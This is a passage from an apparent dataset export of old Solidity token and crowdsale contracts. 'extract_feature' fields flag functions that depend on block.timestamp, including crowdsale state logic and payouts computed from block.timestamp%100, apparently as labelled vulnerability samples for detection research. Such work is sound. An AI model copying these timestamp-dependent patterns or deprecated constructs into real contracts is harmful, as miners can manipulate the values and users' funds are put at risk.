MAX_INVESTMENTS_BEFORE_MULTISIG_CHANGE) {\n throw;\n }\n multisigWallet = addr;\n }\n function isMinimumGoalReached() public constant returns (bool reached) {\n return weiRaised >= minimumFundingGoal;\n }\n function isFinalizerSane() public constant returns (bool sane) {\n return finalizeAgent.isSane();\n }\n function isPricingSane() public constant returns (bool sane) {\n return pricingStrategy.isSane(address(this));\n }\n function getState() public constant returns (State) {\n if(finalized) return State.Finalized;\n else if (address(finalizeAgent) == 0) return State.Preparing;\n else if (!finalizeAgent.isSane()) return State.Preparing;\n else if (!pricingStrategy.isSane(address(this))) return State.Preparing;\n else if (block.timestamp < startsAt) return State.PreFunding;\n else if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\n else if (isMinimumGoalReached()) return State.Success;\n else return State.Failure;\n }\n function isCrowdsale() public constant returns (bool) {\n return true;\n }\n modifier inState(State state) {\n if(getState() != state) throw;\n _;\n }\n function isBreakingCap(uint weiAmount, uint tokenAmount, uint weiRaisedTotal, uint tokensSoldTotal) public constant returns (bool limitBroken);\n function isBreakingInvestorCap(address receiver, uint tokenAmount) public constant returns (bool limitBroken);\n function isCrowdsaleFull() public constant returns (bool);\n function assignTokens(address receiver, uint tokenAmount) private;\n}\ncontract StandardToken is ERC20, SafeMath {\n event Minted(address receiver, uint amount);\n mapping(address => uint) balances;\n mapping (address => mapping (address => uint)) allowed;\n function isToken() public constant returns (bool weAre) {\n return true;\n }\n function transfer(address _to, uint _value) returns (bool success) {\n balances[msg.sender] = safeSub(balances[msg.sender], _value);\n balances[_to] = safeAdd(balances[_to], _value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint _value) returns (bool success) {\n uint _allowance = allowed[_from][msg.sender];\n balances[_to] = safeAdd(balances[_to], _value);\n balances[_from] = safeSub(balances[_from], _value);\n allowed[_from][msg.sender] = safeSub(_allowance, _value);\n Transfer(_from, _to, _value);\n return true;\n }\n function balanceOf(address _owner) constant returns (uint balance) {\n return balances[_owner];\n }\n function approve(address _spender, uint _value) returns (bool success) {\n if ((_value != 0) && (allowed[msg.sender][_spender] != 0)) throw;\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) constant returns (uint remaining) {\n return allowed[_owner][_spender];\n }\n}\ncontract UpgradeAgent {\n uint public originalSupply;\n function isUpgradeAgent() public constant returns (bool) {\n return true;\n }\n function upgradeFrom(address _from, uint256 _value) public;\n}\ncontract UpgradeableToken is StandardToken {\n address public upgradeMaster;\n UpgradeAgent public upgradeAgent;\n uint256 public totalUpgraded;\n enum UpgradeState {Unknown, NotAllowed, WaitingForAgent, ReadyToUpgrade, Upgrading}\n event Upgrade(address indexed _from, address indexed _to, uint256 _value);\n event UpgradeAgentSet(address agent);\n function UpgradeableToken(address _upgradeMaster) {\n upgradeMaster = _upgradeMaster;\n }\n function upgrade(uint256 value) public {\n UpgradeState state = getUpgradeState();\n if(!(state == UpgradeState.ReadyToUpgrade || state == UpgradeState.Upgrading)) {\n throw;\n }\n if (value == 0) throw;\n balances[msg.sender] = safeSub(balances[msg.sender], value);\n totalSupply = safeSub(totalSupply, value);\n totalUpgraded = safeAdd(totalUpgraded, value);\n upgradeAgent.upgradeFrom(msg.sender, value);\n Upgrade(msg.sender, upgradeAgent, value);\n }\n function setUpgradeAgent(address agent) external {\n if(!canUpgrade()) {\n throw;\n }\n if (agent == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n if (getUpgradeState() == UpgradeState.Upgrading) throw;\n upgradeAgent = UpgradeAgent(agent);\n if(!upgradeAgent.isUpgradeAgent()) throw;\n if (upgradeAgent.originalSupply() != totalSupply) throw;\n UpgradeAgentSet(upgradeAgent);\n }\n function getUpgradeState() public constant returns(UpgradeState) {\n if(!canUpgrade()) return UpgradeState.NotAllowed;\n else if(address(upgradeAgent) == 0x00) return UpgradeState.WaitingForAgent;\n else if(totalUpgraded == 0) return UpgradeState.ReadyToUpgrade;\n else return UpgradeState.Upgrading;\n }\n function setUpgradeMaster(address master) public {\n if (master == 0x0) throw;\n if (msg.sender != upgradeMaster) throw;\n upgradeMaster = master;\n }\n function canUpgrade() public constant returns(bool) {\n return true;\n }\n}\ncontract ReleasableToken is ERC20, Ownable {\n address public releaseAgent;\n bool public released = false;\n mapping (address => bool) public transferAgents;\n modifier canTransfer(address _sender) {\n if(!released) {\n if(!transferAgents[_sender]) {\n throw;\n }\n }\n _;\n }\n function setReleaseAgent(address addr) onlyOwner inReleaseState(false) public {\n releaseAgent = addr;\n }\n function setTransferAgent(address addr, bool state) onlyOwner inReleaseState(false) public {\n transferAgents[addr] = state;\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n released = true;\n }\n modifier inReleaseState(bool releaseState) {\n if(releaseState != released) {\n throw;\n }\n _;\n }\n modifier onlyReleaseAgent() {\n if(msg.sender != releaseAgent) {\n throw;\n }\n _;\n }\n function transfer(address _to, uint _value) canTransfer(msg.sender) returns (bool success) {\n return super.transfer(_to, _value);\n }\n function transferFrom(address _from, address _to, uint _value) canTransfer(_from) returns (bool success) {\n return super.transferFrom(_from, _to, _value);\n }\n}\ncontract MintableTokenExt is StandardToken, Ownable {\n using SafeMathLibExt for uint;\n bool public mintingFinished = false;\n mapping (address => bool) public mintAgents;\n event MintingAgentChanged(address addr, bool state );\n struct ReservedTokensData {\n uint inTokens;\n uint inPercentageUnit;\n uint inPercentageDecimals;\n bool isReserved;\n bool isDistributed;\n }\n mapping (address => ReservedTokensData) public reservedTokensList;\n address[] public reservedTokensDestinations;\n uint public reservedTokensDestinationsLen = 0;\n bool reservedTokensDestinationsAreSet = false;\n modifier onlyMintAgent() {\n if(!mintAgents[msg.sender]) {\n throw;\n }\n _;\n }\n modifier canMint() {\n if(mintingFinished) throw;\n _;\n }\n function finalizeReservedAddress(address addr) public onlyMintAgent canMint {\n ReservedTokensData storage reservedTokensData = reservedTokensList[addr];\n reservedTokensData.isDistributed = true;\n }\n function isAddressReserved(address addr) public constant returns (bool isReserved) {\n return reservedTokensList[addr].isReserved;\n }\n function areTokensDistributedForAddress(address addr) public constant returns (bool isDistributed) {\n return reservedTokensList[addr].isDistributed;\n }\n function getReservedTokens(address addr) public constant returns (uint inTokens) {\n return reservedTokensList[addr].inTokens;\n }\n function getReservedPercentageUnit(address addr) public constant returns (uint inPercentageUnit) {\n return reservedTokensList[addr].inPercentageUnit;\n }\n function getReservedPercentageDecimals(address addr) public constant returns (uint inPercentageDecimals) {\n return reservedTokensList[addr].inPercentageDecimals;\n }\n function setReservedTokensListMultiple(\n address[] addrs,\n uint[] inTokens,\n uint[] inPercentageUnit,\n uint[] inPercentageDecimals\n ) public canMint onlyOwner {\n assert(!reservedTokensDestinationsAreSet);\n assert(addrs.length == inTokens.length);\n assert(inTokens.length == inPercentageUnit.length);\n assert(inPercentageUnit.length == inPercentageDecimals.length);\n for (uint iterator = 0; iterator < addrs.length; iterator++) {\n if (addrs[iterator] != address(0)) {\n setReservedTokensList(addrs[iterator], inTokens[iterator], inPercentageUnit[iterator], inPercentageDecimals[iterator]);\n }\n }\n reservedTokensDestinationsAreSet = true;\n }\n function mint(address receiver, uint amount) onlyMintAgent canMint public {\n totalSupply = totalSupply.plus(amount);\n balances[receiver] = balances[receiver].plus(amount);\n Transfer(0, receiver, amount);\n }\n function setMintAgent(address addr, bool state) onlyOwner canMint public {\n mintAgents[addr] = state;\n MintingAgentChanged(addr, state);\n }\n function setReservedTokensList(address addr, uint inTokens, uint inPercentageUnit, uint inPercentageDecimals) private canMint onlyOwner {\n assert(addr != address(0));\n if (!isAddressReserved(addr)) {\n reservedTokensDestinations.push(addr);\n reservedTokensDestinationsLen++;\n }\n reservedTokensList[addr] = ReservedTokensData({\n inTokens: inTokens,\n inPercentageUnit: inPercentageUnit,\n inPercentageDecimals: inPercentageDecimals,\n isReserved: true,\n isDistributed: false\n });\n }\n}\ncontract CrowdsaleTokenExt is ReleasableToken, MintableTokenExt, UpgradeableToken {\n event UpdatedTokenInformation(string newName, string newSymbol);\n event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\n string public name;\n string public symbol;\n uint public decimals;\n uint public minCap;\n function CrowdsaleTokenExt(string _name, string _symbol, uint _initialSupply, uint _decimals, bool _mintable, uint _globalMinCap)\n UpgradeableToken(msg.sender) {\n owner = msg.sender;\n name = _name;\n symbol = _symbol;\n totalSupply = _initialSupply;\n decimals = _decimals;\n minCap = _globalMinCap;\n balances[owner] = totalSupply;\n if(totalSupply > 0) {\n Minted(owner, totalSupply);\n }\n if(!_mintable) {\n mintingFinished = true;\n if(totalSupply == 0) {\n throw;\n }\n }\n }\n function releaseTokenTransfer() public onlyReleaseAgent {\n mintingFinished = true;\n super.releaseTokenTransfer();\n }\n function canUpgrade() public constant returns(bool) {\n return released && super.canUpgrade();\n }\n function setTokenInformation(string _name, string _symbol) onlyOwner {\n name = _name;\n symbol = _symbol;\n UpdatedTokenInformation(name, symbol);\n }\n function claimTokens(address _token) public onlyOwner {\n require(_token != address(0));\n ERC20 token = ERC20(_token);\n uint balance = token.balanceOf(this);\n token.transfer(owner, balance);\n ClaimedTokens(_token, owner, balance);\n }\n}\ncontract ReservedTokensFinalizeAgent is FinalizeAgent {\n using SafeMathLibExt for uint;\n CrowdsaleTokenExt public token;\n CrowdsaleExt public crowdsale;\n uint public distributedReservedTokensDestinationsLen = 0;\n function ReservedTokensFinalizeAgent(CrowdsaleTokenExt _token, CrowdsaleExt _crowdsale) public {\n token = _token;\n crowdsale = _crowdsale;\n }\n function isSane() public constant returns (bool) {\n return (token.releaseAgent() == address(this));\n }\n function distributeReservedTokens(uint reservedTokensDistributionBatch) public {\n assert(msg.sender == address(crowdsale));\n assert(reservedTokensDistributionBatch > 0);\n assert(!reservedTokensAreDistributed);\n assert(distributedReservedTokensDestinationsLen < token.reservedTokensDestinationsLen());\n uint tokensSold = 0;\n for (uint8 i = 0; i < crowdsale.joinedCrowdsalesLen(); i++) {\n CrowdsaleExt tier = CrowdsaleExt(crowdsale.joinedCrowdsales(i));\n tokensSold = tokensSold.plus(tier.tokensSold());\n }\n uint startLooping = distributedReservedTokensDestinationsLen;\n uint batch = token.reservedTokensDestinationsLen().minus(distributedReservedTokensDestinationsLen);\n if (batch >= reservedTokensDistributionBatch) {\n batch = reservedTokensDistributionBatch;\n }\n uint endLooping = startLooping + batch;\n for (uint j = startLooping; j < endLooping; j++) {\n address reservedAddr = token.reservedTokensDestinations(j);\n if (!token.areTokensDistributedForAddress(reservedAddr)) {\n uint allocatedBonusInPercentage;\n uint allocatedBonusInTokens = token.getReservedTokens(reservedAddr);\n uint percentsOfTokensUnit = token.getReservedPercentageUnit(reservedAddr);\n uint percentsOfTokensDecimals = token.getReservedPercentageDecimals(reservedAddr);\n if (percentsOfTokensUnit > 0) {\n allocatedBonusInPercentage = tokensSold * percentsOfTokensUnit / 10**percentsOfTokensDecimals / 100;\n token.mint(reservedAddr, allocatedBonusInPercentage);\n }\n if (allocatedBonusInTokens > 0) {\n token.mint(reservedAddr, allocatedBonusInTokens);\n }\n token.finalizeReservedAddress(reservedAddr);\n distributedReservedTokensDestinationsLen++;\n }\n }\n if (distributedReservedTokensDestinationsLen == token.reservedTokensDestinationsLen()) {\n reservedTokensAreDistributed = true;\n }\n }\n function finalizeCrowdsale() public {\n assert(msg.sender == address(crowdsale));\n if (token.reservedTokensDestinationsLen() > 0) {\n assert(reservedTokensAreDistributed);\n }\n token.releaseTokenTransfer();\n }\n}",
  "extract_feature": [
    "function getState() public constant returns (State) {\nif(finalized) return State.Finalized;\nelse if (address(finalizeAgent) == 0) return State.Preparing;\nelse if (!finalizeAgent.isSane()) return State.Preparing;\nelse if (!pricingStrategy.isSane(address(this))) return State.Preparing;\nelse if (block.timestamp < startsAt) return State.PreFunding;\nelse if (block.timestamp <= endsAt && !isCrowdsaleFull()) return State.Funding;\nelse if (isMinimumGoalReached()) return State.Success;\nelse return State.Failure;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaaafa0e1460cdfa1f51"
  },
  "filename": "8293.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function add(uint a, uint b) internal pure returns (uint c) {\n c = a + b;\n require(c >= a);\n }\n function sub(uint a, uint b) internal pure returns (uint c) {\n require(b <= a);\n c = a - b;\n }\n function mul(uint a, uint b) internal pure returns (uint c) {\n c = a * b;\n require(a == 0 || c / a == b);\n }\n function div(uint a, uint b) internal pure returns (uint c) {\n require(b > 0);\n c = a / b;\n }\n}\ncontract ERC20Interface {\n function totalSupply() public view returns (uint);\n function balanceOf(address tokenOwner) public view returns (uint balance);\n function allowance(address tokenOwner, address spender) public view returns (uint remaining);\n function transfer(address to, uint tokens) public returns (bool success);\n function approve(address spender, uint tokens) public returns (bool success);\n function transferFrom(address from, address to, uint tokens) public returns (bool success);\n event Transfer(address indexed from, address indexed to, uint tokens);\n event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n}\ncontract Owned {\n address public owner;\n address public newOwner;\n address internal admin;\n modifier onlyOwner {\n require(msg.sender == owner);\n _;\n }\n modifier onlyAdmin {\n require(msg.sender == admin || msg.sender == owner);\n _;\n }\n event OwnershipTransferred(address indexed _from, address indexed _to);\n event AdminChanged(address indexed _from, address indexed _to);\n function Owned() public {\n owner = msg.sender;\n admin = msg.sender;\n }\n function setAdmin(address newAdmin) public onlyOwner{\n emit AdminChanged(admin, newAdmin);\n admin = newAdmin;\n }\n function showAdmin() public view onlyAdmin returns(address _admin){\n _admin = admin;\n return _admin;\n }\n function transferOwnership(address _newOwner) public onlyOwner {\n newOwner = _newOwner;\n }\n function acceptOwnership() public {\n require(msg.sender == newOwner);\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n newOwner = address(0);\n }\n}\ncontract ApproveAndCallFallBack {\n function receiveApproval(address from, uint256 tokens, address token, bytes data) public;\n}\ncontract Redenom is ERC20Interface, Owned{\n using SafeMath for uint;\n string public name;\n string public symbol;\n uint private _totalSupply;\n uint public decimals = 8;\n uint public round = 1;\n uint public epoch = 1;\n bool public frozen = false;\n uint[8] private dec = [0,0,0,0,0,0,0,0];\n uint[9] private mul = [1,10,100,1000,10000,100000,1000000,10000000,100000000];\n uint[9] private weight = [uint(0),0,0,0,0,5,10,30,55];\n uint[9] private current_toadd = [uint(0),0,0,0,0,0,0,0,0];\n uint public total_fund;\n uint public epoch_fund;\n uint public team_fund;\n uint public redenom_dao_fund;\n struct Account {\n uint balance;\n uint lastRound;\n uint lastVotedEpoch;\n uint bitmask;\n }\n mapping(address=>Account) accounts;\n mapping(address => mapping(address => uint)) allowed;\n event Redenomination(uint indexed round);\n event Epoch(uint indexed epoch);\n event VotingOn(address indexed initiator);\n event VotingOff(address indexed initiator);\n event Vote(address indexed voter, uint indexed propId, uint voterBalance, uint indexed voteEpoch);\n function Redenom() public {\n symbol = \"NOMT\";\n name = \"Redenom_test\";\n _totalSupply = 0;\n total_fund = 1000000 * 10**decimals;\n epoch_fund = 100000 * 10**decimals;\n total_fund = total_fund.sub(epoch_fund);\n }\n function StartNewEpoch() public onlyAdmin returns(bool succ){\n require(frozen == false);\n require(round == 9);\n require(epoch < 10);\n require(votingActive == false);\n dec = [0,0,0,0,0,0,0,0];\n round = 1;\n epoch++;\n epoch_fund = 100000 * 10**decimals;\n total_fund = total_fund.sub(epoch_fund);\n delete projects;\n emit Epoch(epoch);\n return true;\n }\n bool public votingActive = false;\n modifier onlyVoter {\n require(votingActive == true);\n require(bitmask_check(msg.sender, 4) == true);\n require((accounts[msg.sender].lastVotedEpoch < epoch));\n require(bitmask_check(msg.sender, 1024) == false);\n _;\n }\n struct Project {\n uint id;\n uint votesWeight;\n bool active;\n }\n Project[] public projects;\n function addProject(uint _id) public onlyAdmin {\n projects.push(Project({\n id: _id,\n votesWeight: 0,\n active: true\n }));\n }\n function swapProject(uint _id) public onlyAdmin {\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id){\n if(projects[p].active == true){\n projects[p].active = false;\n }else{\n projects[p].active = true;\n }\n }\n }\n }\n function projectWeight(uint _id) public constant returns(uint PW){\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id){\n return projects[p].votesWeight;\n }\n }\n }\n function projectActive(uint _id) public constant returns(bool PA){\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id){\n return projects[p].active;\n }\n }\n }\n function vote(uint _id) public onlyVoter returns(bool success){\n require(frozen == false);\n for (uint p = 0; p < projects.length; p++){\n if(projects[p].id == _id && projects[p].active == true){\n projects[p].votesWeight += sqrt(accounts[msg.sender].balance);\n accounts[msg.sender].lastVotedEpoch = epoch;\n }\n }\n emit Vote(msg.sender, _id, accounts[msg.sender].balance, epoch);\n return true;\n }\n function winningProject() public constant returns (uint _winningProject){\n uint winningVoteWeight = 0;\n for (uint p = 0; p < projects.length; p++) {\n if (projects[p].votesWeight > winningVoteWeight && projects[p].active == true) {\n winningVoteWeight = projects[p].votesWeight;\n _winningProject = projects[p].id;\n }\n }\n }\n function enableVoting() public onlyAdmin returns(bool succ){\n require(votingActive == false);\n require(frozen == false);\n require(round == 9);\n votingActive = true;\n emit VotingOn(msg.sender);\n return true;\n }\n function disableVoting() public onlyAdmin returns(bool succ){\n require(votingActive == true);\n require(frozen == false);\n votingActive = false;\n emit VotingOff(msg.sender);\n return true;\n }\n function sqrt(uint x) internal pure returns (uint y) {\n uint z = (x + 1) / 2;\n y = x;\n while (z < y) {\n y = z;\n z = (x / z + z) / 2;\n }\n }\n function pay1(address to) public onlyAdmin returns(bool success){\n require(bitmask_check(to, 4) == false);\n uint new_amount = 100000000;\n payout(to,new_amount);\n bitmask_add(to, 4);\n return true;\n }\n function pay055(address to) public onlyAdmin returns(bool success){\n require(bitmask_check(to, 2) == false);\n uint new_amount = 55566600 + (block.timestamp%100);\n payout(to,new_amount);\n bitmask_add(to, 2);\n return true;\n }\n function pay055loyal(address to) public onlyAdmin returns(bool success){\n require(epoch > 1);\n require(bitmask_check(to, 4) == true);\n uint new_amount = 55566600 + (block.timestamp%100);\n payout(to,new_amount);\n return true;\n }\n function payCustom(address to, uint amount) public onlyOwner returns(bool success){\n payout(to,amount);\n return true;\n }\n function payout(address to, uint amount) private returns (bool success){\n require(to != address(0));\n require(amount>=current_mul());\n require(bitmask_check(to, 1024) == false);\n require(frozen == false);\n updateAccount(to);\n uint fixedAmount = fix_amount(amount);\n renewDec( accounts[to].balance, accounts[to].balance.add(fixedAmount) );\n uint team_part = (fixedAmount/100)*10;\n uint dao_part = (fixedAmount/100)*30;\n uint total = fixedAmount.add(team_part).add(dao_part);\n epoch_fund = epoch_fund.sub(total);\n team_fund = team_fund.add(team_part);\n redenom_dao_fund = redenom_dao_fund.add(dao_part);\n accounts[to].balance = accounts[to].balance.add(fixedAmount);\n _totalSupply = _totalSupply.add(total);\n emit Transfer(address(0), to, fixedAmount);\n return true;\n }\n function withdraw_team_fund(address to, uint amount) public onlyOwner returns(bool success){\n require(amount <= team_fund);\n accounts[to].balance = accounts[to].balance.add(amount);\n team_fund = team_fund.sub(amount);\n return true;\n }\n function withdraw_dao_fund(address to, uint amount) public onlyOwner returns(bool success){\n require(amount <= redenom_dao_fund);\n accounts[to].balance = accounts[to].balance.add(amount);\n redenom_dao_fund = redenom_dao_fund.sub(amount);\n return true;\n }\n function freeze_contract() public onlyOwner returns(bool success){\n require(frozen == false);\n frozen = true;\n return true;\n }\n function unfreeze_contract() public onlyOwner returns(bool success){\n require(frozen == true);\n frozen = false;\n return true;\n }\n function renewDec(uint initSum, uint newSum) internal returns(bool success){\n if(round < 9){\n uint tempInitSum = initSum;\n uint tempNewSum = newSum;\n uint cnt = 1;\n while( (tempNewSum > 0 || tempInitSum > 0) && cnt <= decimals ){\n uint lastInitSum = tempInitSum%10;\n tempInitSum = tempInitSum/10;\n uint lastNewSum = tempNewSum%10;\n tempNewSum = tempNewSum/10;\n if(cnt >= round){\n if(lastNewSum >= lastInitSum){\n dec[decimals-cnt] = dec[decimals-cnt].add(lastNewSum - lastInitSum);\n }else{\n dec[decimals-cnt] = dec[decimals-cnt].sub(lastInitSum - lastNewSum);\n }\n }\n cnt = cnt+1;\n }\n }\n return true;\n }\n function bitmask_add(address user, uint _bit) internal returns(bool success){\n require(bitmask_check(user, _bit) == false);\n accounts[user].bitmask = accounts[user].bitmask.add(_bit);\n return true;\n }\n function bitmask_rm(address user, uint _bit) internal returns(bool success){\n require(bitmask_check(user, _bit) == true);\n accounts[user].bitmask = accounts[user].bitmask.sub(_bit);\n return true;\n }\n function bitmask_check(address user, uint _bit) internal view returns (bool status){\n bool flag;\n accounts[user].bitmask & _bit == 0 ? flag = false : flag = true;\n return flag;\n }\n function ban_user(address user) public onlyAdmin returns(bool success){\n bitmask_add(user, 1024);\n return true;\n }\n function unban_user(address user) public onlyAdmin returns(bool success){\n bitmask_rm(user, 1024);\n return true;\n }\n function is_banned(address user) public view onlyAdmin returns (bool result){\n return bitmask_check(user, 1024);\n }\n function redenominate() public onlyAdmin returns(uint current_round){\n require(frozen == false);\n require(round<9);\n _totalSupply = _totalSupply.sub( team_fund%mul[round] ).sub( redenom_dao_fund%mul[round] ).sub( dec[8-round]*mul[round-1] );\n _totalSupply = ( _totalSupply / mul[round] ) * mul[round];\n team_fund = ( team_fund / mul[round] ) * mul[round];\n redenom_dao_fund = ( redenom_dao_fund / mul[round] ) * mul[round];\n if(round>1){\n uint superold = dec[(8-round)+1];\n epoch_fund = epoch_fund.add(superold * mul[round-2]);\n dec[(8-round)+1] = 0;\n }\n if(round<8){\n uint unclimed = dec[8-round];\n uint total_current = dec[8-1-round];\n if(total_current==0){\n current_toadd = [0,0,0,0,0,0,0,0,0];\n round++;\n return round;\n }\n uint[9] memory numbers =[uint(1),2,3,4,5,6,7,8,9];\n uint[9] memory ke9 =[uint(0),0,0,0,0,0,0,0,0];\n uint[9] memory k2e9 =[uint(0),0,0,0,0,0,0,0,0];\n uint k05summ = 0;\n for (uint k = 0; k < ke9.length; k++) {\n ke9[k] = numbers[k]*1e9/total_current;\n if(k<5) k05summ += ke9[k];\n }\n for (uint k2 = 5; k2 < k2e9.length; k2++) {\n k2e9[k2] = uint(ke9[k2])+uint(k05summ)*uint(weight[k2])/uint(100);\n }\n for (uint n = 5; n < current_toadd.length; n++) {\n current_toadd[n] = k2e9[n]*unclimed/10/1e9;\n }\n }else{\n if(round==8){\n epoch_fund = epoch_fund.add(dec[0] * 10000000);\n dec[0] = 0;\n }\n }\n round++;\n emit Redenomination(round);\n return round;\n }\n function updateAccount(address account) public returns(uint new_balance){\n require(frozen == false);\n require(round<=9);\n require(bitmask_check(account, 1024) == false);\n if(round > accounts[account].lastRound){\n if(round >1 && round <=8){\n uint tempDividedBalance = accounts[account].balance/current_mul();\n uint newFixedBalance = tempDividedBalance*current_mul();\n uint lastActiveDigit = tempDividedBalance%10;\n uint diff = accounts[account].balance - newFixedBalance;\n if(diff > 0){\n accounts[account].balance = newFixedBalance;\n emit Transfer(account, address(0), diff);\n }\n uint toBalance = 0;\n if(lastActiveDigit>0 && current_toadd[lastActiveDigit-1]>0){\n toBalance = current_toadd[lastActiveDigit-1] * current_mul();\n }\n if(toBalance > 0 && toBalance < dec[8-round+1]){\n renewDec( accounts[account].balance, accounts[account].balance.add(toBalance) );\n emit Transfer(address(0), account, toBalance);\n accounts[account].balance = accounts[account].balance.add(toBalance);\n dec[8-round+1] = dec[8-round+1].sub(toBalance);\n _totalSupply = _totalSupply.add(toBalance);\n }\n accounts[account].lastRound = round;\n return accounts[account].balance;\n }else{\n if( round == 9){\n uint newBalance = fix_amount(accounts[account].balance);\n uint _diff = accounts[account].balance.sub(newBalance);\n if(_diff > 0){\n renewDec( accounts[account].balance, newBalance );\n accounts[account].balance = newBalance;\n emit Transfer(account, address(0), _diff);\n }\n accounts[account].lastRound = round;\n return accounts[account].balance;\n }\n }\n }\n }\n function current_mul() internal view returns(uint _current_mul){\n return mul[round-1];\n }\n function fix_amount(uint amount) public view returns(uint fixed_amount){\n return ( amount / current_mul() ) * current_mul();\n }\n function get_rest(uint amount) internal view returns(uint fixed_amount){\n return amount % current_mul();\n }\n function totalSupply() public view returns (uint) {\n return _totalSupply;\n }\n function balanceOf(address tokenOwner) public constant returns (uint balance) {\n return accounts[tokenOwner].balance;\n }\n function allowance(address tokenOwner, address spender) public constant returns (uint remaining) {\n return allowed[tokenOwner][spender];\n }\n function transfer(address to, uint tokens) public returns (bool success) {\n require(frozen == false);\n require(to != address(0));\n require(bitmask_check(to, 1024) == false);\n tokens = fix_amount(tokens);\n require(tokens>0);\n updateAccount(to);\n updateAccount(msg.sender);\n uint fromOldBal = accounts[msg.sender].balance;\n uint toOldBal = accounts[to].balance;\n accounts[msg.sender].balance = accounts[msg.sender].balance.sub(tokens);\n accounts[to].balance = accounts[to].balance.add(tokens);\n require(renewDec(fromOldBal, accounts[msg.sender].balance));\n require(renewDec(toOldBal, accounts[to].balance));\n emit Transfer(msg.sender, to, tokens);\n return true;\n }\n function approve(address spender, uint tokens) public returns (bool success) {\n require(frozen == false);\n require(bitmask_check(msg.sender, 1024) == false);\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n return true;\n }\n function transferFrom(address from, address to, uint tokens) public returns (bool success) {\n require(frozen == false);\n require(bitmask_check(to, 1024) == false);\n updateAccount(from);\n updateAccount(to);\n uint fromOldBal = accounts[from].balance;\n uint toOldBal = accounts[to].balance;\n accounts[from].balance = accounts[from].balance.sub(tokens);\n allowed[from][msg.sender] = allowed[from][msg.sender].sub(tokens);\n accounts[to].balance = accounts[to].balance.add(tokens);\n require(renewDec(fromOldBal, accounts[from].balance));\n require(renewDec(toOldBal, accounts[to].balance));\n emit Transfer(from, to, tokens);\n return true;\n }\n function approveAndCall(address spender, uint tokens, bytes data) public returns (bool success) {\n require(frozen == false);\n require(bitmask_check(msg.sender, 1024) == false);\n allowed[msg.sender][spender] = tokens;\n emit Approval(msg.sender, spender, tokens);\n ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, this, data);\n return true;\n }\n function () public payable {\n revert();\n }\n function transferAnyERC20Token(address tokenAddress, uint tokens) public onlyOwner returns (bool success) {\n require(frozen == false);\n return ERC20Interface(tokenAddress).transfer(owner, tokens);\n }\n}",
  "extract_feature": [
    "function pay055(address to) public onlyAdmin returns(bool success){\nrequire(bitmask_check(to, 2) == false);\nuint new_amount = 55566600 + (block.timestamp%100);\npayout(to,new_amount);\nbitmask_add(to, 2);\nreturn true;\n}",
    "function pay055loyal(address to) public onlyAdmin returns(bool success){\nrequire(epoch > 1);\nrequire(bitmask_check(to, 4) == true);\nuint new_amount = 55566600 + (block.timestamp%100);\npayout(to,new_amount);\nreturn true;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaabfa0e1460cdfa1f52"
  },
  "filename": "8305.sol",
  "content": "pragma solidity ^0.4.19;\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n function Ownable() public {\n owner = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract ERC20Basic {\n function totalSupply() public view returns (uint256);\n function balanceOf(address who) public view returns (uint256);\n function transfer(address to, uint256 value) public returns (bool);\n event Transfer(address indexed from, address indexed to, uint256 value);\n}\ncontract BasicToken is ERC20Basic {\n using SafeMath for uint256;\n mapping(address => uint256) balances;\n uint256 totalSupply_;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[msg.sender]);\n balances[msg.sender] = balances[msg.sender].sub(_value);\n balances[_to] = balances[_to].add(_value);\n Transfer(msg.sender, _to, _value);\n return true;\n }\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return balances[_owner];\n }\n}\ncontract ERC20 is ERC20Basic {\n function allowance(address owner, address spender) public view returns (uint256);\n function transferFrom(address from, address to, uint256 value) public returns (bool);\n function approve(address spender, uint256 value) public returns (bool);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\ncontract StandardToken is ERC20, BasicToken {\n mapping (address => mapping (address => uint256)) internal allowed;\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances[_from]);\n require(_value <= allowed[_from][msg.sender]);\n balances[_from] = balances[_from].sub(_value);\n balances[_to] = balances[_to].add(_value);\n allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\n Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed[_owner][_spender];\n }\n function increaseApproval(address _spender, uint _addedValue) public returns (bool) {\n allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n function decreaseApproval(address _spender, uint _subtractedValue) public returns (bool) {\n uint oldValue = allowed[msg.sender][_spender];\n if (_subtractedValue > oldValue) {\n allowed[msg.sender][_spender] = 0;\n } else {\n allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\n }\n Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\n return true;\n }\n}\ncontract GigERC20 is StandardToken, Ownable {\n uint256 public creationBlock;\n uint8 public decimals;\n string public name;\n string public symbol;\n string public standard;\n bool public 